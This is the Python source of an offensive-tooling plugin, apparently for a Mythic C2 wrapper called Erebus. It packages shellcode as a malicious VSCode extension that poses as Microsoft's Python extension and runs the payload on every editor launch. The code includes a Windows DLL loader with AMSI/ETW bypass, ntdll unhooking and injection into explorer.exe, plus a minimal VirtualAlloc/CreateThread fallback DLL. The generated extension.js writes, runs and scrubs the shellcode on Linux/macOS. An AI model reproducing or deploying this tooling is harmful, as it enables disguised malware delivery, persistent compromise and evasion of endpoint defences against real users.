"""
Erebus Plugin - VSCode Extension Trigger
Author: Whispergate
Description: Packages Mythic shellcode as a malicious VSCode .vsix extension.
             Uses the existing Erebus.Loader (full DLL build) loaded via
             Node.js require() - no PowerShell, no AMSI, no child processes.
             Falls back to a minimal cross-compiled DLL if the loader source
             is unavailable.

Technique: MDSec - Leveraging VSCode Extensions for Initial Access (2023)
MITRE:     T1204.002 - User Execution: Malicious File
           T1546     - Event Triggered Execution (onStartupFinished persistence)

Delivery:  ISO/ZIP container -> victim double-clicks installer.vsix ->
           code --install-extension fires -> onStartupFinished activates ->
           shellcode executes on every subsequent VSCode launch (free persistence)

Windows execution path (preferred):
  require('./payload.node') -> LoadLibrary -> DllMain(DLL_PROCESS_ATTACH) ->
  NtCreateThreadEx(EntryThread) -> entry() -> evasion patches + injection.
  payload.node IS the Erebus.Loader DLL (full injection methods, AMSI/ETW
  bypass, ntdll unhook, guardrails) built with TARGET=dll from the Makefile.
  Default injection: EarlyCascade into explorer.exe - shellcode runs in a
  clean host process, not in code.exe itself.

Linux/macOS execution path:
  tmpfs write (mode 0700) + detached exec, file scrubbed after 8s.

OPSEC Notes:
  - Windows: no PS child process; shellcode runs in target process (not code.exe)
  - Full Erebus evasion stack: AMSI/ETW bypass, ntdll unhook, NtCreateThreadEx
  - Shellcode + DLL inside .vsix ZIP - rarely scanned at rest
  - Extension persists in ~/.vscode/extensions/ - no registry, no scheduled task
  Detection vectors:
  - .vsix side-load (no marketplace origin) - MDE flags this
  - code.exe -> NtCreateThreadEx(explorer.exe) cross-process injection
  Evasion Maturity: Level 4
"""

import json
import os
import pathlib
import random
import secrets
import shutil
import string
import subprocess
import stat
import sys
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class VsCodeExtTriggerPlugin(ErebusPlugin):
    """
    VSCode extension trigger using the Erebus.Loader DLL loaded via Node.js require().
    Full injection stack (EarlyCascade/PoolParty/etc.), AMSI/ETW bypass, ntdll unhook.
    Falls back to a minimal mingw-cross-compiled DLL if loader source is unavailable.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT   = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE  = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"
        self.DECOY_FILE  = self.AGENT_CODE / "decoys" / "decoy.pdf"
        self.LOADER_SRC  = self.AGENT_CODE / "Erebus.Loaders" / "Erebus.Loader"
        self.TEMPLATE_DIR = self.AGENT_CODE / "templates"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="vscode_ext_trigger",
            version="3.0.0",
            author="Whispergate",
            description="Packages shellcode as a malicious VSCode .vsix using Erebus.Loader DLL (no PowerShell)",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_vscode_ext_trigger": self.create_vscode_ext_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        for tool in ("node", "npm", "vsce"):
            if not shutil.which(tool):
                return (False, f"Required tool not on PATH: '{tool}' - check Dockerfile")
        # Cross-compiler needed for fallback path; loader build uses make
        if not shutil.which("x86_64-w64-mingw32-gcc"):
            return (False, "Required tool not on PATH: 'x86_64-w64-mingw32-gcc'")
        return (True, None)

    def on_load(self):
        loader_available = (self.LOADER_SRC / "Makefile").exists()
        print(f"[Plugin] VSCode Extension Trigger loaded "
              f"({'Erebus.Loader DLL' if loader_available else 'minimal fallback DLL'})")

    # ================================================================
    # Core plugin function
    # ================================================================

    def create_vscode_ext_trigger(
        self,
        shellcode_path: pathlib.Path,
        payload_dir: Optional[pathlib.Path] = None,
        decoy_file: Optional[pathlib.Path] = None,
        # [MALLEABLE] Typosquat identity shown in VSCode Extensions panel
        fake_name: str = "vscode-python-tools",
        publisher: str = "ms-python",
        display_name: str = "Python Language Support",
        description: str = "Python IntelliSense, linting, debugging, and formatting.",
        output_filename: str = "installer.vsix",
        # Injection config - only used when Erebus.Loader source is available
        injection_type: int = 3,          # 3=EarlyCascade (remote). Injects into target_process.
        target_process: str = "explorer.exe",  # Host process for remote injection
    ) -> pathlib.Path:
        """
        Build a .vsix extension that silently executes shellcode on VSCode startup.

        Windows: builds payload.node from the Erebus.Loader source (full DLL with
        all injection methods and evasion). DllMain fires on require(), launching
        NtCreateThreadEx → entry() → shellcode injected into target_process.
        Falls back to a minimal mingw-cross-compiled DLL if the loader source is
        not reachable (e.g. standalone plugin testing).

        Linux/macOS: writes shellcode to tmpfs (mode 0700), spawns detached,
        scrubs after 8s.

        injection_type values (remote injection modes recommended for OPSEC):
          1 = NtMapViewOfSection   (remote)
          2 = CreateFiber          (self - runs in code.exe)
          3 = EarlyCascade         (remote) ← default
          4 = PoolParty            (remote)
          5 = NtQueueApcThread     (remote)
          6 = ModuleStomp          (self)
          7 = KernelCallbackTable  (self)
          8 = TxfHollow            (remote)
        """
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        shellcode_bytes = pathlib.Path(shellcode_path).read_bytes()
        rand_name = "".join(random.choices(string.ascii_lowercase, k=10))

        stage_dir = payload_dir / f".vscode_stage_{rand_name}"
        stage_dir.mkdir(parents=True, exist_ok=True)
        (stage_dir / "out").mkdir(exist_ok=True)

        try:
            # Resolve loader source: prefer the build-time tempdir copy derived
            # from shellcode_path (agent_build_path/shellcode/payload.bin →
            # agent_build_path/Erebus.Loaders/Erebus.Loader), fall back to the
            # static agent_code checkout.
            sc_path = pathlib.Path(shellcode_path)
            derived_loader = sc_path.parent.parent / "Erebus.Loaders" / "Erebus.Loader"
            if (derived_loader / "Makefile").exists():
                loader_src = derived_loader
            elif (self.LOADER_SRC / "Makefile").exists():
                loader_src = self.LOADER_SRC
            else:
                loader_src = None

            if loader_src is not None:
                self._build_erebus_dll(
                    shellcode_bytes, loader_src,
                    stage_dir / "out",
                    injection_type, target_process,
                    rand_name,
                )
            else:
                # Fallback: minimal VirtualAlloc + CreateThread DLL (no evasion)
                self._compile_node_dll(shellcode_bytes, stage_dir / "out")

            # package.json
            manifest = {
                "name": fake_name,
                "publisher": publisher,
                "displayName": display_name,
                "description": description,
                "version": "1.0.0",
                "engines": {"vscode": "^1.60.0"},
                "activationEvents": ["onStartupFinished"],
                "main": "./out/extension.js",
                "contributes": {},
            }
            (stage_dir / "package.json").write_text(
                json.dumps(manifest, indent=2), encoding="utf-8"
            )

            (stage_dir / "out" / "extension.js").write_text(
                self._render_extension_js(shellcode_bytes, rand_name),
                encoding="utf-8",
            )

            (stage_dir / ".vscodeignore").write_text(
                "node_modules/**\n.vscode/**\n*.ts\nsrc/**\n*.c\n",
                encoding="utf-8",
            )

            vsix_out = payload_dir / output_filename
            try:
                subprocess.run(
                    ["vsce", "package", "--no-dependencies", "--out", str(vsix_out)],
                    cwd=stage_dir,
                    check=True,
                    capture_output=True,
                )
            except subprocess.CalledProcessError as e:
                raise RuntimeError(
                    f"vsce packaging failed: {e.stderr.decode(errors='replace')}"
                ) from e
        finally:
            shutil.rmtree(stage_dir, ignore_errors=True)

        if decoy_file is None:
            decoy_file = self.DECOY_FILE
        if pathlib.Path(decoy_file).exists():
            self._set_hidden(pathlib.Path(decoy_file))

        return vsix_out

    # ================================================================
    # Loader build (preferred path)
    # ================================================================

    def _build_erebus_dll(
        self,
        shellcode_bytes: bytes,
        loader_src: pathlib.Path,
        out_dir: pathlib.Path,
        injection_type: int,
        target_process: str,
        rand_name: str,
    ) -> pathlib.Path:
        """
        Build erebus.dll from the existing Erebus.Loader Makefile and rename to
        payload.node. Copies the source tree to a temp dir under out_dir so
        the original source is not modified and concurrent builds don't collide.

        shellcode.hpp: raw bytes, no encryption (VSCode trigger receives pre-shellcrypt payload).
        config.hpp:    full evasion defaults, configurable injection type and target.
        """
        build_dir = out_dir / f"_build_{rand_name}"
        shutil.copytree(loader_src, build_dir)

        dll_path = out_dir / "payload.node"
        try:
            # shellcode.hpp - raw bytes embedded as C array, no key/nonce
            sc_array = ", ".join(f"0x{b:02x}" for b in shellcode_bytes)
            (build_dir / "include" / "shellcode.hpp").write_text(
                "unsigned char key[] = { 0x00 };\n"
                "unsigned char nonce[] = { 0x00 };\n"
                f"unsigned char shellcode[] = {{ {sc_array} }};\n",
                encoding="utf-8",
            )

            # config.hpp - rendered directly (no Jinja2 needed for fixed defaults)
            (build_dir / "include" / "config.hpp").write_text(
                self._render_loader_config_hpp(injection_type, target_process),
                encoding="utf-8",
            )

            hash_seed = f"0x{secrets.randbits(32):08X}"
            result = subprocess.run(
                [
                    "make", "-C", str(build_dir),
                    "-B",  # always-make: builder.py may have compiled the loader as EXE
                           # in the same temp tree; stale .o files (no -DBUILD_DLL) would
                           # otherwise be reused and produce a WinMain DLL with no DllMain.
                    f"EREBUS_HASH_SEED={hash_seed}",
                    "TARGET=dll",
                    "CONFIG_SYSCALL_BACKEND=0",
                    "CONFIG_CALLSTACK_SPOOF_ENABLED=0",
                    "all",
                ],
                check=True,
                capture_output=True,
            )

            shutil.copy(build_dir / "erebus.dll", dll_path)
        except subprocess.CalledProcessError as e:
            raise RuntimeError(
                f"Erebus.Loader DLL build failed: {e.stderr.decode(errors='replace')}"
            ) from e
        finally:
            shutil.rmtree(build_dir, ignore_errors=True)

        return dll_path

    def _render_loader_config_hpp(self, injection_type: int, target_process: str) -> str:
        """
        Render a config.hpp equivalent for the VSCode trigger DLL build.
        All options match the Jinja2 template semantics; guardrails disabled,
        AMSI/ETW bypass enabled (type 1), ntdll unhook enabled.
        """
        injection_map = {
            1: "erebus::InjectionNtMapViewOfSection",
            2: "erebus::InjectionCreateFiber",
            3: "erebus::InjectionEarlyCascade",
            4: "erebus::InjectionPoolParty",
            5: "erebus::InjectionNtQueueApcThread",
            6: "erebus::InjectionModuleStomp",
            7: "erebus::InjectionKernelCallback",
            8: "erebus::InjectionTxfHollow",
        }
        execute_macro = injection_map.get(injection_type, "erebus::InjectionEarlyCascade")
        # Types 2, 6, 7 are self-injection; everything else is remote
        injection_mode = 2 if injection_type in (2, 6, 7) else 1
        tp = target_process.replace("\\", "\\\\")

        return f"""\
#ifndef EREBUS_CONFIG
#define EREBUS_CONFIG
#pragma once

#define CONFIG_COMPRESSION_TYPE 0
#define CONFIG_ENCODING_TYPE    0
#define CONFIG_ENCRYPTION_TYPE  0

#ifndef CONFIG_TARGET_PROCESS
#define CONFIG_TARGET_PROCESS L"{tp}"
#endif

#ifndef CONFIG_INJECTION_TYPE
#define CONFIG_INJECTION_TYPE {injection_type}
#endif

#define CONFIG_INJECTION_MODE {injection_mode}
#define ExecuteShellcode {execute_macro}

#include "guardrails/guardrails.hpp"

#define CONFIG_GUARDRAILS_ENABLED                  0
#define CONFIG_GUARDRAILS_CHECK_DEBUGGER           0
#define CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER    0
#define CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES 0
#define CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS 0
#define CONFIG_GUARDRAILS_CHECK_TIMING             0
#define CONFIG_GUARDRAILS_CHECK_SANDBOX            0
#define CONFIG_GUARDRAILS_CHECK_DOMAIN_JOINED      0
#define CONFIG_GUARDRAILS_CHECK_UPTIME             0
#define CONFIG_GUARDRAILS_UPTIME_MIN_SECONDS       300
#define CONFIG_GUARDRAILS_CHECK_SCREEN_RESOLUTION  0
#define CONFIG_GUARDRAILS_CHECK_SECURE_BOOT        0
#define CONFIG_SINGLE_INSTANCE                     0
#define CONFIG_GUARDRAILS_DECOY_FILE               ""

// XOR key placeholder for guardrail list decrypt (lists are empty)
#define GR_XOR_KEYLEN 1
__attribute__((unused))
static unsigned char g_gr_xor_key[GR_XOR_KEYLEN] = {{ 0xab }};

#ifndef CONFIG_SYSCALL_BACKEND
#define CONFIG_SYSCALL_BACKEND 0
#endif

#ifndef CONFIG_CALLSTACK_SPOOF_ENABLED
#define CONFIG_CALLSTACK_SPOOF_ENABLED 0
#endif

#define CONFIG_CALLSTACK_SPOOF_MODULE_COUNT 3
#define CONFIG_CALLSTACK_SPOOF_MODULES \\
    erebus::HashStringFowlerNollVoVariant1a("ntdll.dll"), \\
    erebus::HashStringFowlerNollVoVariant1a("kernel32.dll"), \\
    erebus::HashStringFowlerNollVoVariant1a("kernelbase.dll")

#ifndef CONFIG_SLEEP_OBFUSCATION_TYPE
#define CONFIG_SLEEP_OBFUSCATION_TYPE    0
#endif
#ifndef CONFIG_SLEEP_OBFUSCATION_BASE_MS
#define CONFIG_SLEEP_OBFUSCATION_BASE_MS 5000
#endif
#ifndef CONFIG_SLEEP_OBFUSCATION_JITTER_MS
#define CONFIG_SLEEP_OBFUSCATION_JITTER_MS 3000
#endif

#ifndef CONFIG_AMSI_BYPASS_TYPE
#define CONFIG_AMSI_BYPASS_TYPE 1
#endif
#ifndef CONFIG_ETW_BYPASS_TYPE
#define CONFIG_ETW_BYPASS_TYPE  1
#endif
#ifndef CONFIG_UNHOOK_SCOPE
#define CONFIG_UNHOOK_SCOPE     0
#endif
#ifndef CONFIG_PATCH_XOR_KEY
#define CONFIG_PATCH_XOR_KEY 0xAB
#endif

#endif // EREBUS_CONFIG
"""

    # ================================================================
    # Fallback: minimal cross-compiled DLL (no Erebus loader available)
    # ================================================================

    def _compile_node_dll(self, shellcode_bytes: bytes, out_dir: pathlib.Path) -> pathlib.Path:
        """
        Fallback: cross-compile a minimal Windows DLL that runs shellcode from
        DllMain via VirtualAlloc + CreateThread. Used when Erebus.Loader source
        is not available (e.g. standalone testing outside the build pipeline).
        Requires x86_64-w64-mingw32-gcc on PATH.
        """
        sc_bytes = ", ".join(f"0x{b:02x}" for b in shellcode_bytes)
        c_src = (
            "#define WIN32_LEAN_AND_MEAN\n"
            "#include <windows.h>\n"
            f"static unsigned char sc[] = {{{sc_bytes}}};\n"
            "BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p) {\n"
            "    if (r == DLL_PROCESS_ATTACH) {\n"
            "        DisableThreadLibraryCalls(h);\n"
            "        void *m = VirtualAlloc(NULL, sizeof(sc),\n"
            "                              MEM_COMMIT | MEM_RESERVE,\n"
            "                              PAGE_EXECUTE_READWRITE);\n"
            "        if (!m) return TRUE;\n"
            "        __builtin_memcpy(m, sc, sizeof(sc));\n"
            "        CloseHandle(CreateThread(NULL, 0,\n"
            "                    (LPTHREAD_START_ROUTINE)m, NULL, 0, NULL));\n"
            "    }\n"
            "    return TRUE;\n"
            "}\n"
        )

        src_path = out_dir / "_loader.c"
        dll_path = out_dir / "payload.node"
        src_path.write_text(c_src, encoding="utf-8")

        try:
            subprocess.run(
                [
                    "x86_64-w64-mingw32-gcc",
                    "-shared", "-o", str(dll_path),
                    str(src_path),
                    "-lkernel32", "-s", "-O2", "-mwindows",
                    "-Wl,--enable-stdcall-fixup",
                ],
                check=True,
                capture_output=True,
            )
        except subprocess.CalledProcessError as e:
            raise RuntimeError(
                f"Fallback DLL compile failed: {e.stderr.decode(errors='replace')}"
            ) from e
        finally:
            src_path.unlink(missing_ok=True)

        return dll_path

    # ================================================================
    # extension.js renderer
    # ================================================================

    def _render_extension_js(self, shellcode_bytes: bytes, rand_name: str) -> str:
        """
        Render extension.js.

        Windows: require('./payload.node') triggers DllMain in the Erebus.Loader
        DLL. The require() throws (no NAPI exports) but the NtCreateThreadEx'd
        loader thread is already running by then - catch silences it.

        Linux/macOS: tmpfs write + detached exec, scrubbed after 8s.
        """
        import base64
        shellcode_b64 = base64.b64encode(shellcode_bytes).decode()

        return (
            "'use strict';\n"
            "const vscode = require('vscode');\n"
            "const cp     = require('child_process');\n"
            "const fs     = require('fs');\n"
            "const os     = require('os');\n"
            "const path   = require('path');\n"
            "\n"
            "function activate(context) {\n"
            "    _run(context);\n"
            "}\n"
            "\n"
            "function _run(context) {\n"
            "    try {\n"
            "        if (os.platform() === 'win32') {\n"
            "            // Load Erebus.Loader DLL via require() - DllMain fires on LoadLibrary.\n"
            "            // require() throws (no NAPI exports) but NtCreateThreadEx'd loader\n"
            "            // thread is already running at that point.\n"
            "            try { require(path.join(context.extensionPath, 'out', 'payload.node')); } catch(_) {}\n"
            "        } else {\n"
            "            // Linux / macOS: tmpfs write + detached exec, scrub after 8s\n"
            f"            const sc  = Buffer.from('{shellcode_b64}', 'base64');\n"
            f"            const bin = path.join(os.tmpdir(), '.' + '{rand_name}');\n"
            "            fs.writeFileSync(bin, sc, { mode: 0o700 });\n"
            "            cp.spawn(bin, [], { detached: true, stdio: 'ignore' }).unref();\n"
            "            setTimeout(() => { try { fs.unlinkSync(bin); } catch(_) {} }, 8000);\n"
            "        }\n"
            "    } catch (_) {}\n"
            "}\n"
            "\n"
            "function deactivate() {}\n"
            "\n"
            "module.exports = { activate, deactivate };\n"
        )

    @staticmethod
    def _set_hidden(file_path: pathlib.Path):
        """Mirror of the hidden-file pattern used across Erebus trigger plugins."""
        try:
            if sys.platform == "win32":
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(str(file_path), 0x02)
            else:
                os.chmod(file_path, stat.S_IRUSR | stat.S_IWUSR)
        except Exception:
            pass


# Module-level instance for plugin auto-discovery
_plugin = VsCodeExtTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
